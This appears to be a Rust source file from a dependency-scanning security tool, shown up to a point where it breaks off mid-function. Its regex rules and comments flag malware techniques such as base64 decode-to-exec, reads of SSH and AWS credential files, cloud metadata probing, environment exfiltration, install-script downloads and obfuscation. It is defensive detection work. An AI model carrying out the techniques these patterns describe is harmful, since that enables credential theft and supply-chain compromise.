use std::path::Path;

use rayon::prelude::*;
use regex::Regex;
use walkdir::WalkDir;

use crate::ast::AstAnalyzer;
use crate::checks::{Check, CheckResult, Confidence, Finding, ScanContext, Severity};

struct PatternRule {
    rule_id: &'static str,
    #[allow(dead_code)]
    name: &'static str,
    description: &'static str,
    suggestion: &'static str,
    #[allow(dead_code)]
    narrative: &'static str,
    pattern: &'static str,
    severity: Severity,
    confidence: Confidence,
}

const PATTERN_RULES: &[PatternRule] = &[
    PatternRule {
        rule_id: "DEPSEC-P001",
        name: "Shell Execution",
        description: "eval()/exec() with decoded or variable input",
        suggestion: "Verify commands are static or properly escaped — safe for build tools, suspicious for runtime libraries",
        narrative: "Calls child_process.exec/spawn with variable arguments. If user-controlled, enables Remote Code Execution. Common in build tools where it's expected.",
        pattern: r"(?i)\b(eval|exec)\s*\(\s*[a-zA-Z_]",
        severity: Severity::High,
        confidence: Confidence::Low,
    },
    PatternRule {
        rule_id: "DEPSEC-P002",
        name: "Encoded Execution",
        description: "base64 decode → execute chain",
        suggestion: "Investigate immediately — base64-to-exec is the #1 malware obfuscation pattern",
        narrative: "Decodes base64/atob data and passes it to eval, exec, or Function. This is the #1 obfuscation pattern in npm malware. Legitimate uses are rare.",
        pattern: r#"(?i)(atob|base64[._\-]?decode|Buffer\.from\([^)]+,\s*['"]base64['"]).*\b(eval|exec|Function|spawn|child_process|require)\b"#,
        severity: Severity::Critical,
        confidence: Confidence::High, // Same-line decode→exec is the #1 malware pattern
    },
    PatternRule {
        rule_id: "DEPSEC-P003",
        name: "Raw IP Network Call",
        description: "HTTP calls to raw IP addresses",
        suggestion: "Check if the IP is a known service — raw IPs in production deps are suspicious",
        narrative: "Makes HTTP requests to a hardcoded IP address instead of a domain. Malware uses raw IPs to avoid DNS-based blocking. Could also be local dev/testing.",
        pattern: r#"(?i)(https?://|fetch\s*\(\s*['"]https?://|request\s*\(\s*['"]https?://|axios\.\w+\s*\(\s*['"]https?://)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"#,
        severity: Severity::High,
        confidence: Confidence::Medium,
    },
    PatternRule {
        rule_id: "DEPSEC-P004",
        name: "Credential Harvesting",
        description: "File reads targeting sensitive directories",
        suggestion: "Remove immediately — no legitimate package reads your SSH keys or AWS credentials",
        narrative: "Reads files from ~/.ssh, ~/.aws, ~/.env, or ~/.gnupg. These contain credentials and private keys. Legitimate packages never need to read your credentials.",
        pattern: r#"(?i)(readFile|read_file|open)\s*\(\s*['"]?(~/?\.(ssh|aws|env|gnupg)|/home/[^/]+/\.(ssh|aws|env|gnupg)|/root/\.(ssh|aws|env|gnupg))"#,
        severity: Severity::Critical,
        confidence: Confidence::High,
    },
    PatternRule {
        rule_id: "DEPSEC-P005",
        name: "Steganographic Payload",
        description: "Binary file read → byte extraction → execution",
        suggestion: "Investigate the binary file — hiding payloads in images/audio is a known malware technique",
        narrative: "Reads binary files (.wav, .mp3, .png, .ico) and extracts bytes. A known malware technique: hide executable payload in media files to evade text scanners.",
        pattern: r"(?i)(readFileSync|read_file|open)\s*\(.*\.(wav|mp3|png|jpg|ico|bmp)\b",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
    },
    PatternRule {
        rule_id: "DEPSEC-P006",
        name: "Install Script Download",
        description: "postinstall/preinstall scripts with network calls",
        suggestion: "Review the install script — legitimate uses include downloading prebuilt binaries",
        narrative: "Install script makes network calls (curl, wget, fetch). These run automatically during npm install with full system access. Malware uses them to download second-stage payloads.",
        pattern: r"(?i)(curl|wget|fetch|https?\.get|request\(|axios\.\w+)\s*\(",
        severity: Severity::High,
        confidence: Confidence::High,
    },
    PatternRule {
        rule_id: "DEPSEC-P008",
        name: "Dynamic Code Construction",
        description: "new Function() with dynamic input",
        suggestion: "Expected for template engines — verify template inputs are properly escaped",
        narrative: "Uses new Function() to create executable code from strings at runtime. Standard for template engines (ejs, pug, handlebars). Dangerous if the input string is user-controlled.",
        pattern: r"new\s+Function\s*\(\s*[a-zA-Z_]",
        severity: Severity::High,
        confidence: Confidence::Medium,
    },
    PatternRule {
        rule_id: "DEPSEC-P010",
        name: "Cloud Credential Probing",
        description: "Cloud IMDS credential probing",
        suggestion: "Remove immediately unless this is a cloud SDK — IMDS access from deps is a red flag",
        narrative: "Accesses the cloud instance metadata service (169.254.169.254). IMDS provides IAM credentials and instance identity. If your code runs in cloud, this could steal credentials.",
        pattern: r"169\.254\.(169\.254|170\.2)\b",
        severity: Severity::Critical,
        confidence: Confidence::High,
    },
    PatternRule {
        rule_id: "DEPSEC-P011",
        name: "Environment Exfiltration",
        description: "Environment variable serialization/exfiltration",
        suggestion: "Check if serialized env is sent over the network — legitimate logging should filter secrets",
        narrative: "Serializes process.env or os.environ to JSON. Environment variables often contain API keys and secrets. Serializing all of them is a prerequisite for exfiltration.",
        pattern: r"(?i)(JSON\.stringify\s*\(\s*process\.env|os\.environ\b|process\.env\b.*JSON|toJSON\(secrets\))",
        severity: Severity::High,
        confidence: Confidence::Medium,
    },
    PatternRule {
        rule_id: "DEPSEC-P013",
        name: "Dynamic Require",
        description: "require() with non-literal argument — module name computed at runtime",
        suggestion: "Dynamic require() is almost never legitimate in dependencies — this is a strong malware indicator",
        narrative: "Calls require() with a variable, function call, or computed expression instead of a string literal. This hides the actual module being loaded, defeating static analysis. The #1 evasion technique in npm malware.",
        pattern: r#"require\s*\(\s*[^'"`)\s]"#,
        severity: Severity::High,
        confidence: Confidence::Low,
    },
    PatternRule {
        rule_id: "DEPSEC-P014",
        name: "String Deobfuscation",
        description: "String.fromCharCode with XOR/bitwise operations — deobfuscation routine",
        suggestion: "Legitimate code rarely combines charCodeAt with XOR — this is a strong obfuscation indicator",
        narrative: "Uses String.fromCharCode combined with XOR or bitwise operations to decode hidden strings at runtime. This is the primary obfuscation technique in npm malware like the axios/plain-crypto-js attack.",
        pattern: r"String\.fromCharCode\s*\(.*[\^+\-]",
        severity: Severity::High,
        confidence: Confidence::Medium,
    },
    PatternRule {
        rule_id: "DEPSEC-P015",
        name: "Anti-Forensic File Operations",
        description: "Self-deleting code or evidence destruction",
        suggestion: "Self-deleting install scripts are a hallmark of supply chain malware — investigate immediately",
        narrative: "Deletes its own source file or replaces package.json after execution to destroy evidence. The axios/plain-crypto-js attack deleted setup.js and renamed package.md to package.json to appear clean after infection.",
        pattern: r"(unlinkSync|rmSync)\s*\(.*(__filename|__dirname|setup\.js|package\.json)",
        severity: Severity::Critical,
        confidence: Confidence::High,
    },
    PatternRule {
        rule_id: "DEPSEC-P017",
        name: "Code Obfuscation",
        description: "Common obfuscation patterns: hex identifiers, infinite loops, dynamic global access",
        suggestion: "Obfuscated code in dependencies is a strong malware indicator — review manually",
        narrative: "Uses patterns common in JavaScript obfuscators: hex-prefixed function names (_0x...), while(!![]) infinite loops, or dynamic global property access via Buffer.from. From Datadog GuardDog's npm-obfuscation rules.",
        pattern: r"(?:function\s+_0x[a-fA-F0-9]|while\s*\(\s*!!\s*\[\s*\]\s*\)|global\s*\[\s*Buffer\.from\()",
        severity: Severity::High,
        confidence: Confidence::Medium,
    },
    PatternRule {
        rule_id: "DEPSEC-P018",
        name: "Node Internal Binding",
        description: "Direct access to Node.js internal bindings — bypasses require() completely",
        suggestion: "process.binding() is almost never used in userland — investigate immediately",
        narrative: "Accesses Node.js internal C++ bindings directly via process.binding() or process._linkedBinding(). This bypasses the normal require() system entirely, making it invisible to import-based capability detection.",
        pattern: r"process\.(binding|_linkedBinding)\s*\(",
        severity: Severity::Critical,
        confidence: Confidence::High,
    },
    PatternRule {
        rule_id: "DEPSEC-P019",
        name: "VM Code Execution",
        description: "vm module used to execute arbitrary code strings",
        suggestion: "vm.runInThisContext/compileFunction can execute obfuscated payloads — review the code being executed",
        narrative: "Uses Node.js vm module to compile and execute code strings at runtime. This can bypass static analysis by constructing code dynamically and executing it in the current or a new context.",
        pattern: r"vm\.(runInThisContext|runInNewContext|compileFunction|createScript)\s*\(",
        severity: Severity::High,
        confidence: Confidence::Medium,
    },
];

#[cfg(test)]
const BINARY_EXTENSIONS: &[&str] = &[
    ".node", ".so", ".dll", ".dylib", ".wasm", ".exe", ".bin", ".png", ".jpg", ".jpeg", ".gif",
    ".bmp", ".ico", ".svg", ".ttf", ".woff", ".woff2", ".eot", ".zip", ".tar", ".gz", ".bz2",
    ".pdf", ".doc", ".docx",
];

/// Extensions that produce false positives — metadata/declarations, not executable code
#[cfg(test)]
const SKIP_EXTENSIONS: &[&str] = &[
    ".map",         // source maps — stringified source, never executed
    ".d.ts",        // TypeScript declarations — type definitions only
    ".d.mts",       // module declaration files
    ".d.cts",       // CommonJS declaration files
    ".tsbuildinfo", // TypeScript build cache — hashes/metadata, never executable
    ".min.js",      // minified bundles — legitimate compressed code, not malware
    ".min.mjs",     // minified ES modules
    ".min.cjs",     // minified CommonJS
    ".bundle.js",   // pre-bundled code
];

/// Directory names inside dep dirs that should be skipped entirely.
/// NOTE: test/tests/spec are NOT skipped — malicious packages can hide payloads there.
const SKIP_DIR_NAMES: &[&str] = &[
    ".vite",         // Vite prebundled cache — duplicates of node_modules packages
    ".svelte-kit",   // SvelteKit generated output — duplicates of source files
    ".cache",        // Build caches (babel, eslint, etc.)
    "__pycache__",   // Python bytecode cache
    ".mypy_cache",   // mypy type checker cache
    ".pytest_cache", // pytest cache
    ".tox",          // tox test runner
    "@types",        // TypeScript type declarations — never contain malicious code
    "typings",       // Legacy TypeScript typings
    ".turbo",        // Turborepo cache
    ".next",         // Next.js build output
    ".nuxt",         // Nuxt.js build output
    "coverage",      // Test coverage reports
];

/// Non-code files inside dep dirs that should be skipped
#[cfg(test)]
const SKIP_FILENAMES: &[&str] = &[
    "README.md",
    "readme.md",
    "CHANGELOG.md",
    "changelog.md",
    "HISTORY.md",
    "LICENSE",
    "LICENSE.md",
    "license",
];

const DEP_DIRS: &[&str] = &[
    "node_modules",
    "vendor", // covers vendor/bundle, vendor/gems, and Go/PHP vendor dirs
    ".venv",
    "venv",
];

const MAX_FILE_SIZE: u64 = 500_000; // 500KB

/// Collect files to scan using lockfile package entries (fast path).
/// Instead of walking the entire dep tree, walks each package directory shallowly.
fn collect_files_from_lockfile(
    root: &Path,
    packages: &[crate::scan_cache::LockPackage],
    extra_skip_dirs: &[String],
) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();
    for pkg in packages {
        let pkg_dir = match &pkg.dir_path {
            Some(dp) => root.join(dp),
            None => continue, // No dir_path (e.g., Cargo registry) — skip
        };
        if !pkg_dir.exists() {
            continue;
        }

        for entry in WalkDir::new(&pkg_dir)
            .follow_links(false)
            .max_depth(3) // Shallow: package root + src/lib/dist
            .into_iter()
            .filter_entry(|e| {
                if e.file_type().is_dir() {
                    let name = e.file_name().to_str().unwrap_or("");
                    return !should_skip_dir(name) && !extra_skip_dirs.iter().any(|d| d == name);
                }
                let name = e.file_name().to_str().unwrap_or("");
                is_scannable_file(name)
            })
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            files.push(entry.into_path());
        }
    }
    files
}

/// Collect files to scan using full WalkDir (fallback when no lockfile exists).
fn collect_files_walkdir(root: &Path, extra_skip_dirs: &[String]) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();
    for dep_dir_name in DEP_DIRS {
        let dep_dir = root.join(dep_dir_name);
        if !dep_dir.exists() {
            continue;
        }

        let skip = extra_skip_dirs.to_vec();
        for entry in WalkDir::new(&dep_dir)
            .follow_links(false)
            .max_depth(7)
            .into_iter()
            .filter_entry(move |e| {
                if e.file_type().is_dir() {
                    let name = e.file_name().to_str().unwrap_or("");
                    return !should_skip_dir(name) && !skip.iter().any(|d| d == name);
                }
                let name = e.file_name().to_str().unwrap_or("");
                is_scannable_file(name)
            })
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            files.push(entry.into_path());
        }
    }
    files
}

/// Scan a single file for pattern matches. Returns None if the file can't be read.
/// Designed to be called from rayon par_iter — each thread has its own AstAnalyzer.
fn scan_single_file(
    path: &Path,
    root: &Path,
    compiled: &[(&PatternRule, Regex)],
    ignored_rules: &[&str],
    ast_analyzer: &mut AstAnalyzer,
) -> Option<Vec<Finding>> {
    let is_large = path
        .metadata()
        .map(|m| m.len() > MAX_FILE_SIZE)
        .unwrap_or(false);

    let is_minified = path
        .file_name()
        .and_then(|n| n.to_str())
        .is_some_and(|n| n.ends_with(".min.js") || n.ends_with(".min.mjs"));

    let content = if is_large {
        let bytes = std::fs::read(path).ok()?;
        let head_len = 50_000.min(bytes.len());
        let tail_start = bytes.len().saturating_sub(50_000);
        let mut sample = bytes[..head_len].to_vec();
        if tail_start > head_len {
            sample.extend_from_slice(&bytes[tail_start..]);
        }
        String::from_utf8_lossy(&sample).to_string()
    } else {
        std::fs::read_to_string(path).ok()?
    };

    let rel_path = path
        .strip_prefix(root)
        .unwrap_or(path)
        .to_string_lossy()
        .to_string();

    let mut findings = Vec::new();

    // AST analysis
    let lang = crate::ast::detect_language(path);
    let needs_ast = lang.is_some()
        && match lang {
            Some(crate::ast::Lang::JavaScript | crate::ast::Lang::TypeScript) => {
                content.contains("child_process")
                    || content.contains("shelljs")
                    || content.contains("execa")
                    || content.contains("cross-spawn")
                    || content.contains("new Function")
                    || content.contains("require(")
                    || content.contains("import(")
                    || content.contains("fromCharCode")
                    || content.contains("unlinkSync")
                    || content.contains("rmSync")
            }
            Some(crate::ast::Lang::Python) => {
                content.contains("subprocess")
                    || content.contains("os.system")
                    || content.contains("os.popen")
                    || content.contains("eval(")
                    || content.contains("exec(")
                    || content.contains("__import__")
                    || content.contains("pickle")
            }
            Some(crate::ast::Lang::Ruby) => {
                content.contains("eval")
                    || content.contains("system")
                    || content.contains("exec")
                    || content.contains("`")
                    || content.contains("send(")
                    || content.contains("open(")
            }
            _ => false,
        };

    let ast_handled = if needs_ast {
        let ast_findings = ast_analyzer.analyze(path, &content);
        let pkg = extract_package_name(&rel_path);
        for af in &ast_findings {
            let suggestion = match af.rule_id.as_str() {
                "DEPSEC-P001" => "Verify commands are static or properly escaped — safe for build tools, suspicious for runtime libraries",
                "DEPSEC-P008" => "Expected for template engines — verify template inputs are properly escaped",
                "DEPSEC-P013" => "Dynamic require() is almost never legitimate in dependencies — this is a strong malware indicator",
                "DEPSEC-P014" => "Legitimate code rarely combines charCodeAt with XOR — this is a strong obfuscation indicator",
                "DEPSEC-P024" => "Never deserialize untrusted pickle data — pickle.loads executes arbitrary code",
                "DEPSEC-P034" => "open(\"|\") spawns a shell command — avoid with untrusted input",
                _ => "Review this dependency for suspicious behavior",
            };
            findings.push(
                Finding::new(af.rule_id.clone(), af.severity, af.message.clone())
                    .with_file(&rel_path, af.line)
                    .with_confidence(af.confidence)
                    .with_suggestion(suggestion)
                    .with_package(pkg.clone()),
            );
        }
        true
    } else {
        false
    };

    let has_dangerous_exec_module = DANGEROUS_EXEC_MODULES.iter().any(|m| content.contains(m));

    // Regex patterns
    for (line_num, raw_line) in content.lines().enumerate() {
        let normalized = normalize_confusables(raw_line);
        let line = &resolve_string_concat(&normalized);
        for (rule, re) in compiled {
            if ast_handled && is_ast_rule(rule.rule_id) && is_js_or_ts(path) {
                continue;
            }

            if rule.rule_id == "DEPSEC-P001" && is_js_or_ts(path) && !has_dangerous_exec_module {
                let trimmed = line.trim();
                if !trimmed.contains("eval") {
                    continue;
                }
            }

            if re.is_match(line) {
                if rule.rule_id == "DEPSEC-P006" && !is_install_script(path, line) {
                    continue;
                }

                let snippet = truncate_line(line, 80);
                findings.push(
                    Finding::new(
                        rule.rule_id,
                        rule.severity,
                        format!("{}: {snippet}", rule.description),
                    )
                    .with_file(&rel_path, line_num + 1)
                    .with_confidence(rule.confidence)
                    .with_suggestion(rule.suggestion)
                    .with_package(extract_package_name(&rel_path)),
                );
            }
        }
    }

    // Entropy check (skip minified)
    if !is_minified && !ignored_rules.contains(&"DEPSEC-P007") {
        check_entropy(&content, &rel_path, &mut findings);
    }

    // Cross-line decode+exec check
    if !ignored_rules.contains(&"DEPSEC-P002") {
        let already_has_p002 = findings
            .iter()
            .any(|f| f.rule_id == "DEPSEC-P002" && f.file.as_deref() == Some(&rel_path));
        if !already_has_p002 {
            check_cross_line_decode_exec(&content, &rel_path, &mut findings);
        }
    }

    Some(findings)
}

pub struct PatternsCheck;

impl Check for PatternsCheck {
    fn name(&self) -> &str {
        "patterns"
    }

    fn run(&self, ctx: &ScanContext) -> anyhow::Result<CheckResult> {
        let max_score = ctx.config.scoring.weight_for("patterns") as f64;

        let ignored_rules: Vec<&str> = ctx
            .config
            .ignore
            .patterns
            .iter()
            .map(|s| s.as_str())
            .collect();

        let compiled: Vec<(&PatternRule, Regex)> = PATTERN_RULES
            .iter()
            .filter(|r| !ignored_rules.contains(&r.rule_id))
            .filter_map(|r| Regex::new(r.pattern).ok().map(|re| (r, re)))
            .collect();

        let mut findings = Vec::new();
        let mut pass_messages = Vec::new();

        // Lock file-based caching: only scan new/changed packages
        let lock_packages = crate::scan_cache::parse_lockfile(ctx.root);
        let has_lockfile = !lock_packages.is_empty();
        let cache = crate::scan_cache::ScanCache::load(ctx.root);
        let packages_to_scan = cache.packages_to_scan(&lock_packages);

        if has_lockfile && packages_to_scan.is_empty() && !cache.scanned.is_empty() {
            pass_messages.push("All packages cached — no changes since last scan".into());
            return Ok(CheckResult::new(
                self.name().to_string(),
                findings,
                10.0,
                pass_messages,
            ));
        }

        // Collect files to scan: lockfile-driven (fast) or WalkDir fallback (slow)
        let files_to_scan = if has_lockfile && !packages_to_scan.is_empty() {
            // FAST PATH: iterate only packages that need scanning, shallow walk each
            collect_files_from_lockfile(ctx.root, &packages_to_scan, &ctx.config.patterns.skip_dirs)
        } else if has_lockfile {
            // First scan with lockfile: scan all packages but use lockfile for enumeration
            collect_files_from_lockfile(ctx.root, &lock_packages, &ctx.config.patterns.skip_dirs)
        } else {
            // FALLBACK: no lockfile — full WalkDir (old behavior)
            collect_files_walkdir(ctx.root, &ctx.config.patterns.skip_dirs)
        };

        if !files_to_scan.is_empty() && has_lockfile {
            let total = if packages_to_scan.is_empty() {
                lock_packages.len()
            } else {
                packages_to_scan.len()
            };
            pass_messages.push(format!(
                "Lockfile-driven scan: {total} package{} to scan",
                if total == 1 { "" } else { "s" }
            ));
        }

        // Scan collected files in parallel using rayon
        let (par_findings, par_count): (Vec<Vec<Finding>>, Vec<usize>) = files_to_scan
            .par_iter()
            .fold(
                || (Vec::new(), Vec::new(), AstAnalyzer::new()),
                |(mut all_findings, mut all_counts, mut ast_analyzer), path| {
                    if let Some(file_findings) = scan_single_file(
                        path,
                        ctx.root,
                        &compiled,
                        &ignored_rules,
                        &mut ast_analyzer,
                    ) {
                        all_counts.push(1);
                        all_findings.push(file_findings);
                    }
                    (all_findings, all_counts, ast_analyzer)
                },
            )
            .map(|(findings, counts, _)| (findings, counts))
            .reduce(
                || (Vec::new(), Vec::new()),
                |(mut a_f, mut a_c), (b_f, b_c)| {
                    a_f.extend(b_f);
                    a_c.extend(b_c);
                    (a_f, a_c)
                },
            );

        for file_findings in par_findings {
            findings.extend(file_findings);
        }
        let scanned_files: usize = par_count.iter().sum();

        // DEPSEC-P009: Python .pth file persistence
        if !ignored_rules.contains(&"DEPSEC-P009") {
            check_pth_files(ctx.root, &mut findings);
        }

        // DEPSEC-P012: package.json install scripts with remote fetch
        if !ignored_rules.contains(&"DEPSEC-P012") {
            check_install_scripts(ctx.root, &mut findings);
        }

        // DEPSEC-P016: Dependency package.json install scripts
        if !ignored_rules.contains(&"DEPSEC-P016") {
            check_dep_install_scripts(ctx.root, &mut findings);
        }

        // DEPSEC-P025: WebAssembly binary presence in packages
        if !ignored_rules.contains(&"DEPSEC-P025") {
            check_wasm_presence(ctx.root, &lock_packages, &mut findings);
        }

        // Signal combination: escalate findings when multiple weak signals co-occur
        apply_signal_combination(&mut findings);

        // Apply per-package allow rules from config
        let allow_rules = &ctx.config.patterns.allow;
        if !allow_rules.is_empty() {
            let before_count = findings.len();
            findings.retain(|f| {
                if let Some(pkg) = &f.package {
                    if let Some(allowed_rules) = allow_rules.get(pkg) {
                        return !allowed_rules.iter().any(|r| r == &f.rule_id);
                    }
                }
                true // Keep findings without package or without allow rules
            });
            let suppressed = before_count - findings.len();
            if suppressed > 0 {
                pass_messages.push(format!(
                    "{suppressed} finding{} suppressed by per-package allow rules",
                    if suppressed == 1 { "" } else { "s" }
                ));
            }
        }

        if scanned_files > 0 {
            if findings.is_empty() {
                pass_messages.push(format!(
                    "0 suspicious patterns found ({scanned_files} dependency files scanned)"
                ));
            } else {
                pass_messages.push(format!(
                    "{} suspicious pattern{} found ({scanned_files} files scanned)",
                    findings.len(),
                    if findings.len() == 1 { "" } else { "s" }
                ));
            }
        } else {
            pass_messages.push("No dependency directories found to scan".into());
        }

        Ok(CheckResult::new(
            "patterns",
            findings,
            max_score,
            pass_messages,
        ))
    }
}

/// Extract package name from a dependency file path.
/// "node_modules/@scope/pkg/lib/file.js" → "@scope/pkg"
/// "node_modules/lodash/index.js" → "lodash"
/// "vendor/bundle/ruby/3.2.0/gems/rails-7.1.0/..." → "rails-7.1.0"
/// ".venv/lib/python3.11/site-packages/requests/..." → "requests"
fn extract_package_name(rel_path: &str) -> Option<String> {
    // Use rfind to handle nested node_modules (e.g., node_modules/a/node_modules/b/...)
    if let Some(pos) = rel_path.rfind("node_modules/") {
        let rest = &rel_path[pos + "node_modules/".len()..];
        let parts: Vec<&str> = rest.splitn(3, '/').collect();
        if parts.is_empty() {
            return None;
        }
        // Scoped package: @scope/name
        if parts[0].starts_with('@') && parts.len() >= 2 {
            return Some(format!("{}/{}", parts[0], parts[1]));
        }
        return Some(parts[0].to_string());
    }

    // vendor/bundle/ruby/X.Y.Z/gems/NAME-VERSION/...
    if let Some(rest) = rel_path.strip_prefix("vendor/") {
        if let Some(gems_pos) = rest.find("gems/") {
            let after_gems = &rest[gems_pos + 5..];
            if let Some(slash) = after_gems.find('/') {
                return Some(after_gems[..slash].to_string());
            }
            return Some(after_gems.to_string());
        }
    }

    // .venv/lib/pythonX.Y/site-packages/NAME/...
    if rel_path.starts_with(".venv/") || rel_path.starts_with("venv/") {
        if let Some(sp_pos) = rel_path.find("site-packages/") {
            let after_sp = &rel_path[sp_pos + 14..];
            if let Some(slash) = after_sp.find('/') {
                return Some(after_sp[..slash].to_string());
            }
            return Some(after_sp.to_string());
        }
    }

    None
}

/// Normalize common unicode confusable characters to their ASCII equivalents.
/// Catches homoglyph attacks where Cyrillic/Greek letters visually identical to
/// Latin characters are used to evade regex-based detection (e.g., evаl with
/// Cyrillic 'а' instead of Latin 'a').
fn normalize_confusables(line: &str) -> String {
    if line.is_ascii() {
        return line.to_string(); // Fast path: no confusables possible
    }
    line.chars()
        .map(|c| match c {
            // Cyrillic → Latin (most common confusables in malware)
            '\u{0430}' => 'a', // а
            '\u{0435}' => 'e', // е
            '\u{043E}' => 'o', // о
            '\u{0440}' => 'p', // р
            '\u{0441}' => 'c', // с
            '\u{0443}' => 'y', // у (maps to y, not u — visual match)
            '\u{0445}' => 'x', // х
            '\u{0410}' => 'A', // А
            '\u{0412}' => 'B', // В
            '\u{0415}' => 'E', // Е
            '\u{041A}' => 'K', // К
            '\u{041C}' => 'M', // М
            '\u{041D}' => 'H', // Н
            '\u{041E}' => 'O', // О
            '\u{0420}' => 'P', // Р
            '\u{0421}' => 'C', // С
            '\u{0422}' => 'T', // Т
            '\u{0425}' => 'X', // Х
            // Greek → Latin
            '\u{03B1}' => 'a', // α (alpha)
            '\u{03BF}' => 'o', // ο (omicron)
            '\u{03C1}' => 'p', // ρ (rho)
            _ => c,
        })
        .collect()
}

/// Resolve obvious string concatenation in a line.
/// Collapses `"a" + "b"` and `'a' + 'b'` into `"ab"` / `'ab'` so regex patterns
/// can match the assembled string. Catches evasion techniques like:
/// - `fs["read" + "File" + "Sync"]` → `fs["readFileSync"]`
/// - `globalThis["ev" + "al"]` → `globalThis["eval"]`
fn resolve_string_concat(line: &str) -> String {
    if !line.contains("\" + \"") && !line.contains("' + '") {
        return line.to_string(); // Fast path: no string concatenation
    }

    // Replace "X" + "Y" → "XY" (double quotes)
    let mut result = line.to_string();
    while result.contains("\" + \"") {
        result = result.replace("\" + \"", "");
    }
    // Replace 'X' + 'Y' → 'XY' (single quotes)
    while result.contains("' + '") {
        result = result.replace("' + '", "");
    }
    result
}

/// Rules that are handled by the AST engine when the file is JS/TS
fn is_ast_rule(rule_id: &str) -> bool {
    // P014 is NOT included: AST detects dense fromCharCode (3+ calls),
    // while regex detects individual fromCharCode+XOR patterns. Complementary.
    matches!(rule_id, "DEPSEC-P001" | "DEPSEC-P008" | "DEPSEC-P013")
}

/// Check if a file is JavaScript or TypeScript (for P001 gating)
fn is_js_or_ts(path: &Path) -> bool {
    let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
    matches!(
        ext,
        "js" | "mjs" | "cjs" | "ts" | "mts" | "cts" | "jsx" | "tsx"
    )
}

/// Dangerous exec modules whose presence justifies P001 regex matching.
/// Without these, exec() calls are benign (regex.exec, db.exec, cursor.exec).
const DANGEROUS_EXEC_MODULES: &[&str] = &["child_process", "shelljs", "execa", "cross-spawn"];

/// Fast pre-filter for the WalkDir: only let through files worth scanning.
/// This runs on every file entry in the walker, so it must be fast (no I/O).
fn is_scannable_file(name: &str) -> bool {
    // Must have an extension we care about
    let ext = match name.rsplit('.').next() {
        Some(e) => e,
        None => return false,
    };

    // Code extensions we scan
    let is_code = matches!(
        ext,
        "js" | "mjs"
            | "cjs"
            | "jsx"
            | "ts"
            | "mts"
            | "cts"
            | "tsx"
            | "py"
            | "pyw"
            | "rb"
            | "rake"
            | "gemspec"
            | "rs"
            | "sh"
            | "pth"
            | "json"
    );
    if !is_code {
        return false;
    }

    // Skip known non-useful code files
    if name.ends_with(".min.js")
        || name.ends_with(".min.mjs")
        || name.ends_with(".min.cjs")
        || name.ends_with(".bundle.js")
        || name.ends_with(".d.ts")
        || name.ends_with(".d.mts")
        || name.ends_with(".d.cts")
        || name.ends_with(".tsbuildinfo")
        || name.ends_with(".map")
    {
        return false;
    }

    // Skip known non-useful filenames
    !matches!(
        name,
        "README.md"
            | "readme.md"
            | "CHANGELOG.md"
            | "changelog.md"
            | "HISTORY.md"
            | "LICENSE"
            | "LICENSE.md"
            | "license"
    )
}

#[cfg(test)]
fn is_binary_ext(path: &Path) -> bool {
    match path.extension().and_then(|e| e.to_str()) {
        Some(ext) => {
            // Compare without dot prefix to avoid heap allocation per file
            BINARY_EXTENSIONS
                .iter()
                .any(|bin_ext| bin_ext.strip_prefix('.') == Some(ext))
        }
        None => false,
    }
}

#[cfg(test)]
fn is_skip_ext(path: &Path) -> bool {
    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    // Check compound extensions like .d.ts, .d.ts.map
    SKIP_EXTENSIONS.iter().any(|ext| name.ends_with(ext))
}

fn should_skip_dir(name: &str) -> bool {
    SKIP_DIR_NAMES.contains(&name)
}

#[cfg(test)]
fn is_skip_filename(path: &Path) -> bool {
    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    SKIP_FILENAMES.contains(&name)
}

fn is_install_script(path: &Path, _line: &str) -> bool {
    // P006 only applies to install scripts (postinstall.sh, preinstall.sh, package.json scripts)
    let filename = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    filename == "postinstall.sh"
        || filename == "preinstall.sh"
        || filename == "install.sh"
        || filename == "postinstall"
        || filename == "preinstall"
}

fn check_entropy(content: &str, file: &str, findings: &mut Vec<Finding>) {
    for (line_num, line) in content.lines().enumerate() {
        // Look for long strings (> 200 chars of non-whitespace)
        for word in line.split_whitespace() {
            // Strip quotes
            let word = word.trim_matches(|c: char| c == '"' || c == '\'' || c == '`');
            if word.len() > 200 {
                let entropy = shannon_entropy(word);
                if entropy > 4.5 {
                    findings.push(
                        Finding::new("DEPSEC-P007", Severity::Medium, format!(
                            "High-entropy string detected ({:.1} bits/char, {} chars)",
                            entropy, word.len()
                        ))
                            .with_file(file, line_num + 1)
                            .with_confidence(Confidence::Low)
                            .with_suggestion("Check if the string is a known data table or if it decodes to executable code")
                            .with_package(extract_package_name(file)),
                    );
                    break; // One finding per line is enough
                }
            }
        }
    }
}

fn shannon_entropy(s: &str) -> f64 {
    crate::utils::shannon_entropy(s)
}

/// DEPSEC-P025: Detect WebAssembly binary presence in dependency packages.
/// WASM in npm packages is unusual and often malicious (CrowdStrike: 75% of WASM in the wild is malicious).
/// No other supply chain scanner inspects WASM contents — detecting presence alone is valuable.
fn check_wasm_presence(
    root: &Path,
    lock_packages: &[crate::scan_cache::LockPackage],
    findings: &mut Vec<Finding>,
) {
    // Collect directories to walk: lockfile package dirs (fast) or full dep dirs (fallback)
    let dirs_to_walk: Vec<std::path::PathBuf> = if !lock_packages.is_empty() {
        lock_packages
            .iter()
            .filter_map(|pkg| pkg.dir_path.as_ref().map(|dp| root.join(dp)))
            .filter(|p| p.exists())
            .collect()
    } else {
        DEP_DIRS
            .iter()
            .map(|d| root.join(d))
            .filter(|p| p.exists())
            .collect()
    };

    let max_depth = if lock_packages.is_empty() { 10 } else { 5 };

    for dir in &dirs_to_walk {
        for entry in WalkDir::new(dir)
            .max_depth(max_depth)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            let path = entry.path();
            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");

            if ext == "wasm" {
                let rel_path = path
                    .strip_prefix(root)
                    .unwrap_or(path)
                    .to_string_lossy()
                    .to_string();
                let pkg = extract_package_name(&rel_path);

                // Phase B: Parse WASM imports for capability analysis
                let imports = parse_wasm_imports(path);
                let severity = if !imports.is_empty() {
